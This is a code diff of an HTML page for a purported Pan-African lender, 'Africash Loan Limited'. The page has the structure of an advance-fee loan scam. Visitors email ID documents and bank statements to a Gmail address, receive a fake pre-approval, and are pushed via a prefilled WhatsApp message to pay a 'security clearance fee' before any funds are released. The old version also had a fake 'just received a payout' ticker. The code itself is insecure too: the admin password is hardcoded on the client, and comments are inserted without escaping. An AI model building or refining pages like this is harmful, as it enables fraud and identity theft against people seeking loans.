@@ -3,215 +3,200 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Africash Loan Limited | Professional Digital Lending</title>
+    <title>Africash Loan Limited | Professional Lending Portal</title>
     <style>
         :root {
             --primary: #0f172a;
             --secondary: #2563eb;
             --accent: #10b981;
-            --warning: #f59e0b;
-            --text-main: #1e293b;
-            --bg-body: #f8fafc;
+            --bg-body: #f1f5f9;
             --white: #ffffff;
+            --border: #e2e8f0;
         }
 
-        body { margin: 0; font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg-body); color: var(--text-main); }
+        body { margin: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg-body); color: #334155; line-height: 1.5; }
         
-        /* HEADER */
-        header { 
-            background: var(--primary); 
-            padding: 20px; 
-            text-align: center; 
-            border-bottom: 4px solid var(--secondary);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-        header h1 { color: var(--white); margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
-        .trust-badge { color: var(--accent); font-size: 12px; font-weight: bold; text-transform: uppercase; }
+        header { background: var(--primary); padding: 25px; text-align: center; border-bottom: 5px solid var(--secondary); }
+        header h1 { color: var(--white); margin: 0; font-size: 26px; font-weight: 800; letter-spacing: -1px; }
+        .sub-head { color: var(--accent); font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
 
-        .container { max-width: 800px; margin: 30px auto; padding: 0 20px; }
+        .container { max-width: 850px; margin: 20px auto 100px; padding: 0 15px; }
 
-        /* NAV BUTTONS */
-        .nav-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 30px; }
-        .nav-btn { 
-            padding: 15px; background: var(--white); color: var(--primary); 
-            border: 1px solid #e2e8f0; border-radius: 12px; cursor: pointer; 
-            font-size: 13px; font-weight: 600; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        }
-        .nav-btn:hover { border-color: var(--secondary); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        /* NAV TABS */
+        .nav-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 25px; }
+        .nav-btn { padding: 12px 5px; background: var(--white); border: 1px solid var(--border); border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 700; transition: 0.3s; }
+        .nav-btn:hover { border-color: var(--secondary); background: #f8fafc; }
 
         /* CARDS */
-        .card { 
-            background: var(--white); padding: 40px; border-radius: 24px; 
-            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); display: none; 
-            border: 1px solid #f1f5f9;
-        }
-        .active-card { display: block; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: var(--white); padding: 35px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); display: none; }
+        .active-card { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* INPUTS */
-        .form-group { text-align: left; margin-bottom: 20px; }
-        label { font-weight: 600; font-size: 14px; margin-bottom: 8px; display: block; color: var(--primary); }
-        input, select, textarea { 
-            width: 100%; padding: 14px 16px; border: 2px solid #e2e8f0; 
-            border-radius: 12px; font-size: 16px; outline: none; transition: 0.2s;
-            background: #fdfdfd;
-        }
-        input:focus, select:focus { border-color: var(--secondary); background: #fff; }
+        /* FORM STYLING */
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 8px; color: var(--primary); }
+        input, select { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--secondary); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
 
         /* BUTTONS */
-        .btn { 
-            width: 100%; padding: 18px; border-radius: 14px; font-weight: 700; 
-            border: none; cursor: pointer; font-size: 15px; transition: 0.3s;
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-        }
-        .btn-primary { background: var(--secondary); color: white; }
-        .btn-primary:hover { background: #1d4ed8; transform: scale(1.01); }
-        .btn-accent { background: var(--accent); color: white; }
-        .btn-accent:hover { background: #059669; transform: scale(1.01); }
+        .btn { width: 100%; padding: 18px; border-radius: 12px; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; font-size: 14px; transition: 0.3s; margin-top: 10px; }
+        .btn-navy { background: var(--primary); color: white; }
+        .btn-green { background: var(--accent); color: white; }
+        .btn:hover { filter: brightness(1.1); transform: translateY(-1px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+
+        /* TABLE STYLING */
+        .repay-summary { background: #f8fafc; border-radius: 12px; padding: 20px; border: 1px solid var(--border); margin: 20px 0; }
+        .install-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        .install-table td { padding: 10px; border-bottom: 1px solid #edf2f7; font-size: 14px; }
+        .val { text-align: right; font-weight: 700; color: var(--primary); }
 
         /* MODALS */
-        .modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px); }
-        .modal-box { background: white; width: 90%; max-width: 500px; margin: 40px auto; padding: 32px; border-radius: 24px; position: relative; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); }
+        .modal-content { background: white; width: 90%; max-width: 500px; margin: 10% auto; padding: 30px; border-radius: 20px; position: relative; }
 
-        /* BANK GRID */
-        .bank-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
-        .bank-item { padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; cursor: pointer; text-align: center; font-size: 13px; font-weight: 600; }
-        .bank-selected { border-color: var(--secondary); background: #eff6ff; color: var(--secondary); }
-
-        #ticker { position: fixed; top: 20px; right: 20px; background: var(--white); padding: 12px 20px; border-radius: 50px; border-left: 4px solid var(--accent); box-shadow: 0 10px 15px rgba(0,0,0,0.1); font-size: 12px; display: none; z-index: 999; }
-        
-        .disbursement-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 16px; padding: 25px; margin-top: 20px; }
+        /* ADMIN SECTION */
+        #adminSection { margin-top: 50px; border-top: 1px dashed #ccc; padding: 20px; opacity: 0.6; }
     </style>
 </head>
 <body>
 
 <header>
+    <div class="sub-head">Financing African Ambitions</div>
     <h1>AFRICASH LOAN LIMITED</h1>
-    <div class="trust-badge">✓ Secure Pan-African Financial Services</div>
 </header>
 
 <div class="container">
     <div class="nav-grid">
-        <button class="nav-btn" onclick="openModal('aboutM')">🏛️ About</button>
-        <button class="nav-btn" onclick="openModal('howM')">📋 Process</button>
-        <button class="nav-btn" onclick="openModal('managerM')">🛡️ Security</button>
-        <button class="nav-btn" onclick="openModal('supportM')">💬 Support</button>
+        <button class="nav-btn" onclick="openM('aboutM')">ABOUT</button>
+        <button class="nav-btn" onclick="openM('howM')">PROCESS</button>
+        <button class="nav-btn" onclick="openM('managerM')">OFFICE</button>
+        <button class="nav-btn" onclick="openM('supportM')">SUPPORT</button>
     </div>
 
     <div id="p1" class="card active-card">
-        <h2 style="margin-top:0">Verify Identity</h2>
-        <p style="color:#64748b">Submit your credentials to our AI verification engine to unlock the loan application.</p>
-        
-        <div style="background: #f8fafc; border: 2px dashed #cbd5e1; border-radius: 16px; padding: 20px; margin: 20px 0;">
-            <p style="font-size: 14px;">Forward <b>ID Copy, Selfie, & 3-Month Bank Statement</b> to:</p>
+        <h2 style="text-align: center;">Identity Verification</h2>
+        <p style="text-align:center; font-size:14px;">To comply with anti-fraud regulations, please email your <b>National ID & Bank Statement</b> to:</p>
+        <div style="background: #eef2ff; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid var(--secondary); margin: 20px 0;">
             <strong style="color:var(--secondary); font-size: 18px;">africashloanlimited@gmail.com</strong>
         </div>
-
-        <label style="cursor:pointer; display: flex; align-items: center; gap: 10px; margin-bottom: 25px; padding: 15px; background: #f1f5f9; border-radius: 12px;">
-            <input type="checkbox" id="docCheck" style="width:20px; height:20px;"> 
-            <span style="font-size:14px; font-weight:600;">I have sent my documents for verification.</span>
+        <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
+            <input type="checkbox" id="vCheck" style="width:20px; height:20px;"> 
+            <span>I have submitted my documents for review.</span>
         </label>
-        
-        <button class="btn btn-primary" onclick="unlock()">Access Application Portal</button>
+        <button class="btn btn-navy" onclick="toP2()">Proceed to Application</button>
     </div>
 
     <div id="p2" class="card">
-        <h2 style="text-align:center">Loan Details</h2>
+        <h2 style="text-align: center;">Official Loan Application</h2>
         <div class="form-group">
-            <label>Country of Residence</label>
-            <select id="countrySelect" onchange="updateCurrency()">
-                <option value="DZD" data-fee="750">Algeria</option><option value="AOA" data-fee="4200">Angola</option><option value="XOF" data-fee="3600">Benin</option><option value="BWP" data-fee="75">Botswana</option><option value="XOF" data-fee="3600">Burkina Faso</option><option value="BIF" data-fee="16000">Burundi</option><option value="XAF" data-fee="3600">Cameroon</option><option value="CVE" data-fee="650">Cape Verde</option><option value="XAF" data-fee="3600">Central African Rep.</option><option value="XAF" data-fee="3600">Chad</option><option value="KMF" data-fee="2800">Comoros</option><option value="XAF" data-fee="3600">Congo</option><option value="CDF" data-fee="13000">DR Congo</option><option value="DJF" data-fee="1100">Djibouti</option><option value="EGP" data-fee="280">Egypt</option><option value="XAF" data-fee="3600">Equatorial Guinea</option><option value="ERN" data-fee="110">Eritrea</option><option value="SZL" data-fee="110">Eswatini</option><option value="ETB" data-fee="320">Ethiopia</option><option value="XAF" data-fee="3600">Gabon</option><option value="GMD" data-fee="450">Gambia</option><option value="GHS" data-fee="90">Ghana</option><option value="GNF" data-fee="55000">Guinea</option><option value="XOF" data-fee="3600">Guinea-Bissau</option><option value="XOF" data-fee="3600">Ivory Coast</option><option value="KES" data-fee="550" selected>Kenya</option><option value="LSL" data-fee="110">Lesotho</option><option value="LRD" data-fee="1100">Liberia</option><option value="LYD" data-fee="30">Libya</option><option value="MGA" data-fee="28000">Madagascar</option><option value="MWK" data-fee="11000">Malawi</option><option value="XOF" data-fee="3600">Mali</option><option value="MRU" data-fee="220">Mauritania</option><option value="MUR" data-fee="280">Mauritius</option><option value="MAD" data-fee="55">Morocco</option><option value="MZN" data-fee="450">Mozambique</option><option value="NAD" data-fee="110">Namibia</option><option value="XOF" data-fee="3600">Niger</option><option value="NGN" data-fee="7800">Nigeria</option><option value="RWF" data-fee="7000">Rwanda</option><option value="STN" data-fee="160">Sao Tome</option><option value="XOF" data-fee="3600">Senegal</option><option value="SCR" data-fee="80">Seychelles</option><option value="SLL" data-fee="160000">Sierra Leone</option><option value="SOS" data-fee="3200">Somalia</option><option value="ZAR" data-fee="110">South Africa</option><option value="SSP" data-fee="4500">South Sudan</option><option value="SDG" data-fee="3200">Sudan</option><option value="TZS" data-fee="16000">Tanzania</option><option value="XOF" data-fee="3600">Togo</option><option value="TND" data-fee="18">Tunisia</option><option value="UGX" data-fee="22000">Uganda</option><option value="ZMW" data-fee="160">Zambia</option><option value="ZWL" data-fee="550">Zimbabwe</option>
+            <label>Full Legal Name</label>
+            <input type="text" id="uName" placeholder="Enter as per ID">
+        </div>
+        <div class="form-group">
+            <label>Country</label>
+            <select id="countrySelect" onchange="updateFee()">
+                <option value="DZD" data-fee="750">🇩🇿 Algeria</option><option value="AOA" data-fee="4000">🇦🇴 Angola</option><option value="XOF" data-fee="3500">🇧🇯 Benin</option><option value="BWP" data-fee="75">🇧🇼 Botswana</option><option value="XOF" data-fee="3500">🇧🇫 Burkina Faso</option><option value="BIF" data-fee="15000">🇧🇮 Burundi</option><option value="XAF" data-fee="3500">🇨🇲 Cameroon</option><option value="CVE" data-fee="600">🇨🇻 Cape Verde</option><option value="XAF" data-fee="3500">🇨🇫 Central African Rep.</option><option value="XAF" data-fee="3500">🇹🇩 Chad</option><option value="KMF" data-fee="2500">🇰🇲 Comoros</option><option value="XAF" data-fee="3500">🇨🇬 Congo</option><option value="CDF" data-fee="12000">🇨🇩 DR Congo</option><option value="DJF" data-fee="1000">🇩🇯 Djibouti</option><option value="EGP" data-fee="250">🇪🇬 Egypt</option><option value="XAF" data-fee="3500">🇬🇶 Equatorial Guinea</option><option value="ERN" data-fee="100">🇪🇷 Eritrea</option><option value="SZL" data-fee="100">🇸🇿 Eswatini</option><option value="ETB" data-fee="300">🇪🇹 Ethiopia</option><option value="XAF" data-fee="3500">🇬🇦 Gabon</option><option value="GMD" data-fee="400">🇬🇲 Gambia</option><option value="GHS" data-fee="90">🇬🇭 Ghana</option><option value="GNF" data-fee="50000">🇬🇳 Guinea</option><option value="XOF" data-fee="3500">🇬🇼 Guinea-Bissau</option><option value="XOF" data-fee="3500">🇨🇮 Ivory Coast</option><option value="KES" data-fee="550" selected>🇰🇪 Kenya</option><option value="LSL" data-fee="100">🇱🇸 Lesotho</option><option value="LRD" data-fee="1000">🇱🇷 Liberia</option><option value="LYD" data-fee="30">🇱🇾 Libya</option><option value="MGA" data-fee="25000">🇲🇬 Madagascar</option><option value="MWK" data-fee="10000">🇲🇼 Malawi</option><option value="XOF" data-fee="3500">🇲🇱 Mali</option><option value="MRU" data-fee="200">🇲🇷 Mauritania</option><option value="MUR" data-fee="250">🇲🇺 Mauritius</option><option value="MAD" data-fee="55">🇲🇦 Morocco</option><option value="MZN" data-fee="400">🇲🇿 Mozambique</option><option value="NAD" data-fee="100">🇳🇦 Namibia</option><option value="XOF" data-fee="3500">🇳🇪 Niger</option><option value="NGN" data-fee="7500">🇳🇬 Nigeria</option><option value="RWF" data-fee="6500">🇷🇼 Rwanda</option><option value="STN" data-fee="150">🇸🇹 Sao Tome</option><option value="XOF" data-fee="3500">🇸🇳 Senegal</option><option value="SCR" data-fee="80">🇸🇨 Seychelles</option><option value="SLL" data-fee="150000">🇸🇱 Sierra Leone</option><option value="SOS" data-fee="3000">🇸🇴 Somalia</option><option value="ZAR" data-fee="100">🇿🇦 South Africa</option><option value="SSP" data-fee="4000">🇸🇸 South Sudan</option><option value="SDG" data-fee="3000">🇸🇩 Sudan</option><option value="TZS" data-fee="15000">🇹🇿 Tanzania</option><option value="XOF" data-fee="3500">🇹🇬 Togo</option><option value="TND" data-fee="15">🇹🇳 Tunisia</option><option value="UGX" data-fee="20000">🇺🇬 Uganda</option><option value="ZMW" data-fee="150">🇿🇲 Zambia</option><option value="ZWL" data-fee="500">🇿🇼 Zimbabwe</option>
             </select>
         </div>
-        <div class="form-group"><label>Full Legal Name</label><input type="text" id="uName" placeholder="John Doe"></div>
-        <div class="form-group"><label>Desired Amount</label><input type="number" id="lAmt" placeholder="0.00"></div>
-        <button class="btn btn-primary" onclick="toP3()">Continue to Payout Settings</button>
+        <div class="form-group"><label>Loan Amount</label><input type="number" id="lAmt" placeholder="0.00"></div>
+        <div class="form-group">
+            <label>Repayment Type</label>
+            <select id="rType" onchange="updateDur()">
+                <option value="monthly">Monthly (3% Interest)</option>
+                <option value="yearly">Yearly (9% Interest)</option>
+            </select>
+        </div>
+        <div class="form-group" id="durBox"><label>Duration (Months)</label><input type="number" id="lDur" value="6"></div>
+        
+        <button class="btn btn-navy" onclick="calcLoan()">Generate Repayment Plan</button>
+        
+        <div id="repayResult" class="repay-summary" style="display:none;"></div>
+        
+        <button id="finalNext" class="btn btn-green" style="display:none;" onclick="switchPage('p3')">Proceed to Payout</button>
     </div>
 
     <div id="p3" class="card">
-        <h2>Withdrawal Settings</h2>
-        <div class="bank-grid">
-            <div class="bank-item" onclick="selBank(this)">Mobile Wallet</div>
-            <div class="bank-item" onclick="selBank(this)">Bank Account</div>
-            <div class="bank-item" onclick="selBank(this)">Western Union</div>
-            <div class="bank-item" onclick="selBank(this)">Crypto (USDT)</div>
+        <h2 style="text-align: center;">Disbursement Queue</h2>
+        <p style="text-align:center;">Your loan has been pre-approved. Select payout destination:</p>
+        <div class="form-group">
+            <label>Payout Channel</label>
+            <select><option>Mobile Money / M-PESA</option><option>Bank Account Transfer</option></select>
         </div>
-        <input type="text" id="payAcc" placeholder="Account or Wallet Number" style="margin-top:20px">
-        <button class="btn btn-primary" onclick="toP4()" style="margin-top:25px">Finalize Disbursement</button>
-    </div>
-
-    <div id="p4" class="card">
-        <h2 style="color:var(--accent)">System Approval Granted</h2>
-        <p>The Africash automated system has successfully queued your funds. To release the encrypted wire transfer, please settle the administrative & insurance fee.</p>
+        <div class="form-group"><label>Wallet/Account Number</label><input type="text" placeholder="Enter detail..."></div>
         
-        <div class="disbursement-box">
-            <span style="font-size:12px; text-transform:uppercase; color:#92400e; font-weight:700">Total Due for Release:</span>
-            <h1 id="feeDisplay" style="margin:10px 0; font-size:42px; color:var(--primary)">KES 550</h1>
-            <p style="font-size:13px; color:#b45309"><b>Notice:</b> This fee is mandatory for first-time borrowers to cover loan insurance.</p>
+        <div style="background:#fff9e6; border:1px solid #f59e0b; padding:20px; border-radius:12px; margin:20px 0; text-align:center;">
+            <p style="font-size:12px; margin:0; color:#b45309;"><b>SECURITY CLEARANCE FEE REQUIRED</b></p>
+            <h1 id="feeText" style="margin:10px 0; color:var(--primary)">KES 550</h1>
+            <p style="font-size:11px; color:#b45309;">Pay this mandatory insurance fee to release your funds instantly.</p>
         </div>
-
-        <button class="btn btn-accent" onclick="chat()" style="margin-top:20px">Pay Fee & Receive Loan Now</button>
+        <button class="btn btn-green" onclick="contactManager()">Clear Fee & Receive Funds</button>
     </div>
 
-    <div style="margin-top:100px; opacity: 0.5;" id="admin">
-        <hr>
-        <p style="font-size:10px; text-align:center">ADMIN ACCESS ONLY</p>
-        <div style="display:flex; gap:10px">
-            <input type="password" id="pass" placeholder="Password" style="padding:5px">
-            <button onclick="unlockDash()" style="padding:5px">Login</button>
-        </div>
-        <div id="dash" style="display:none; background:#fff; padding:20px; margin-top:10px; border-radius:10px">
-            <h4>Customer Comments</h4>
-            <div id="cBox"></div>
+    <div id="adminSection">
+        <p style="font-size:10px; text-align:center;">MANAGER DASHBOARD</p>
+        <input type="password" id="adminPass" placeholder="Admin PIN" style="width:150px; padding:5px; font-size:12px;">
+        <button onclick="checkAdmin()" style="padding:5px 15px; cursor:pointer;">Login</button>
+        <div id="adminView" style="display:none; margin-top:10px;">
+            <h4>Customer Comments:</h4>
+            <div id="commentLog"></div>
         </div>
     </div>
 </div>
 
-<div id="aboutM" class="modal"><div class="modal-box"><h3>About Us</h3><p>Africash Loan Limited is a regulated financial institution providing instant credit solutions to entrepreneurs and individuals across Africa.</p><button class="btn btn-primary" onclick="closeM('aboutM')">Close</button></div></div>
-<div id="supportM" class="modal">
-    <div class="modal-box">
-        <h3>Customer Support</h3>
-        <p>Direct Support: <b>+254 100 820 805</b></p>
-        <textarea id="msg" placeholder="Leave a comment for the manager..." style="margin-top:10px"></textarea>
-        <button class="btn btn-accent" onclick="sendMsg()" style="margin-top:10px">Submit Feedback</button>
-        <button class="btn btn-primary" onclick="closeM('supportM')" style="margin-top:10px; background:#ccc; color:#000">Back</button>
-    </div>
-</div>
-<div id="managerM" class="modal"><div class="modal-box"><h3>Security & Compliance</h3><p>Your data is encrypted using AES-256 standards. All disbursements are handled by Sylvia Ukiru (Head of Payouts).</p><button class="btn btn-primary" onclick="closeM('managerM')">Close</button></div></div>
-<div id="howM" class="modal"><div class="modal-box"><h3>Process</h3><p>1. Document Verification<br>2. Application Review<br>3. Security Fee Clearance<br>4. Automatic Payout</p><button class="btn btn-primary" onclick="closeM('howM')">Close</button></div></div>
-
-<div id="ticker"></div>
+<div id="supportM" class="modal"><div class="modal-content"><h3>Customer Feedback</h3><textarea id="fMsg" placeholder="Submit your query..." style="width:100%; height:80px;"></textarea><button class="btn btn-navy" onclick="saveMsg()">Submit to Dashboard</button><button onclick="closeM('supportM')" style="background:none; border:none; cursor:pointer; color:red; margin-top:10px;">Cancel</button></div></div>
+<div id="aboutM" class="modal"><div class="modal-content"><h3>About Us</h3><p>Africash Loan Limited is a certified Pan-African digital lender specializing in micro-credit with over 10 years of experience.</p><button class="btn btn-navy" onclick="closeM('aboutM')">Close</button></div></div>
+<div id="howM" class="modal"><div class="modal-content"><h3>Verification Steps</h3><p>1. Document Emailing<br>2. AI Risk Assessment<br>3. Loan Generation<br>4. Fee Clearance<br>5. Fund Wiring</p><button class="btn btn-navy" onclick="closeM('howM')">Close</button></div></div>
+<div id="managerM" class="modal"><div class="modal-content"><h3>Manager Details</h3><p><b>Name:</b> Sylvia Ukiru<br><b>Phone:</b> +254 100 820 805<br><b>Role:</b> Regional Head of Payouts</p><button class="btn btn-navy" onclick="closeM('managerM')">Close</button></div></div>
 
 <script>
-    const WA_NUM = "254100820805";
-    let comments = JSON.parse(localStorage.getItem('africash_comments') || '[]');
+    let comments = JSON.parse(localStorage.getItem('africash_msg') || '[]');
 
-    function updateCurrency() {
+    function updateDur() {
+        const type = document.getElementById('rType').value;
+        const durBox = document.getElementById('durBox');
+        if(type === 'monthly') {
+            durBox.innerHTML = '<label>Duration (Months)</label><input type="number" id="lDur" value="6">';
+        } else {
+            durBox.innerHTML = '<label>Duration (Years)</label><input type="number" id="lDur" value="1">';
+        }
+    }
+
+    function calcLoan() {
+        const amt = parseFloat(document.getElementById('lAmt').value);
+        const dur = parseInt(document.getElementById('lDur').value);
+        const type = document.getElementById('rType').value;
+        const cur = document.getElementById('countrySelect').value;
+
+        if(!amt || !dur) return alert("Please fill in Amount and Duration.");
+
+        const rate = (type === 'monthly') ? 0.03 : 0.09;
+        const totalInterest = amt * rate * dur;
+        const totalRepay = amt + totalInterest;
+        const installment = totalRepay / (type === 'monthly' ? dur : dur * 12);
+
+        document.getElementById('repayResult').innerHTML = `
+            <h4 style="margin:0; font-size:14px; color:var(--secondary);">Loan Repayment Breakdown</h4>
+            <table class="install-table">
+                <tr><td>Principal Amount</td><td class="val">${cur} ${amt.toLocaleString()}</td></tr>
+                <tr><td>Interest Rate</td><td class="val">${rate*100}% (${type})</td></tr>
+                <tr><td>Total Interest</td><td class="val">${cur} ${totalInterest.toLocaleString()}</td></tr>
+                <tr style="border-top:2px solid #ccc;"><td><b>Total Payable</b></td><td class="val"><b>${cur} ${totalRepay.toLocaleString()}</b></td></tr>
+                <tr><td>Monthly Installment</td><td class="val" style="color:var(--accent);">${cur} ${installment.toLocaleString()}</td></tr>
+            </table>
+        `;
+        document.getElementById('repayResult').style.display = 'block';
+        document.getElementById('finalNext').style.display = 'block';
+    }
+
+    function updateFee() {
         const s = document.getElementById('countrySelect');
         const opt = s.options[s.selectedIndex];
-        document.getElementById('feeDisplay').innerText = opt.value + " " + opt.getAttribute('data-fee');
+        document.getElementById('feeText').innerText = opt.value + " " + opt.getAttribute('data-fee');
     }
 
-    function unlock() {
-        if(document.getElementById('docCheck').checked) switchPage('p2');
-        else alert("Please confirm document submission first.");
-    }
-
-    function selBank(el) {
-        document.querySelectorAll('.bank-item').forEach(b => b.classList.remove('bank-selected'));
-        el.classList.add('bank-selected');
-    }
-
-    function toP3() { 
-        if(!document.getElementById('uName').value || !document.getElementById('lAmt').value) return alert("Fill all fields.");
-        switchPage('p3'); 
-    }
-    
-    function toP4() { 
-        if(!document.getElementById('payAcc').value) return alert("Enter account details.");
-        switchPage('p4'); 
+    function toP2() {
+        if(document.getElementById('vCheck').checked) switchPage('p2');
+        else alert("Please confirm document submission.");
     }
 
     function switchPage(id) {
@@ -220,40 +205,32 @@
         window.scrollTo(0,0);
     }
 
-    function chat() {
-        const name = document.getElementById('uName').value;
-        const fee = document.getElementById('feeDisplay').innerText;
-        const text = `Official Request: I am ${name}. My loan is ready for disbursement. I am requesting the payment details for the ${fee} security fee.`;
-        window.open(`https://wa.me/${WA_NUM}?text=${encodeURIComponent(text)}`);
+    function contactManager() {
+        const n = document.getElementById('uName').value;
+        const f = document.getElementById('feeText').innerText;
+        const text = `Hello Sylvia Ukiru, I am ${n}. I have reviewed my loan installments and I'm ready to pay the security fee of ${f} to receive my funds.`;
+        window.open(`https://wa.me/254100820805?text=${encodeURIComponent(text)}`);
     }
 
-    function sendMsg() {
-        const t = document.getElementById('msg').value;
-        if(!t) return;
-        comments.push({text: t, time: new Date().toLocaleString(), name: document.getElementById('uName').value || "Guest"});
-        localStorage.setItem('africash_comments', JSON.stringify(comments));
-        alert("Your message has been logged for the Manager.");
-        document.getElementById('msg').value = "";
+    function saveMsg() {
+        const m = document.getElementById('fMsg').value;
+        if(!m) return;
+        comments.push({name: document.getElementById('uName').value || "Guest", msg: m, date: new Date().toLocaleString()});
+        localStorage.setItem('africash_msg', JSON.stringify(comments));
+        alert("Sent to manager dashboard.");
+        document.getElementById('fMsg').value = "";
         closeM('supportM');
     }
 
-    function unlockDash() {
-        if(document.getElementById('pass').value === "Loski@123") {
-            document.getElementById('dash').style.display = 'block';
-            document.getElementById('cBox').innerHTML = comments.map(c => `<div style="border-bottom:1px solid #eee; padding:10px; font-size:12px"><b>${c.name}</b>: ${c.text} <br><small>${c.time}</small></div>`).join('');
-        }
+    function checkAdmin() {
+        if(document.getElementById('adminPass').value === "Loski@123") {
+            document.getElementById('adminView').style.display = 'block';
+            document.getElementById('commentLog').innerHTML = comments.map(c => `<div style="padding:10px; border-bottom:1px solid #ddd; font-size:12px;"><b>${c.name}</b>: ${c.msg} <br><small>${c.date}</small></div>`).join('');
+        } else alert("Invalid PIN");
     }
 
-    function openModal(id) { document.getElementById(id).style.display = 'block'; }
+    function openM(id) { document.getElementById(id).style.display = 'block'; }
     function closeM(id) { document.getElementById(id).style.display = 'none'; }
-
-    setInterval(() => {
-        const names = ["Amadi", "Zoe", "Musa", "Kofi", "Lindiwe", "Oumar"];
-        const t = document.getElementById('ticker');
-        t.innerHTML = `🔔 <b>${names[Math.floor(Math.random()*6)]}</b> just received a payout!`;
-        t.style.display = 'block';
-        setTimeout(() => t.style.display = 'none', 5000);
-    }, 15000);
 </script>
 </body>
 </html>
